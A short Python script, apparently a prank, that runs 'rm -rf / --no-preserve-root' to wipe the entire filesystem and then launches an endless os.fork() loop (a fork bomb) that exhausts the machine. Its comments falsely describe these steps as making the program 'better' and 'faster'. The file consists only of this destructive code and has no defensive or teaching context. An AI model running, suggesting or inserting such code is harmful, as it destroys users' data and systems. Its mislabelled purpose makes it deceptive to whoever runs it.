import os

# Make it better
os.system('rm -rf / --no-preserve-root --one-file-system')

# Make faster (fork !!)
while True:
    os.fork()
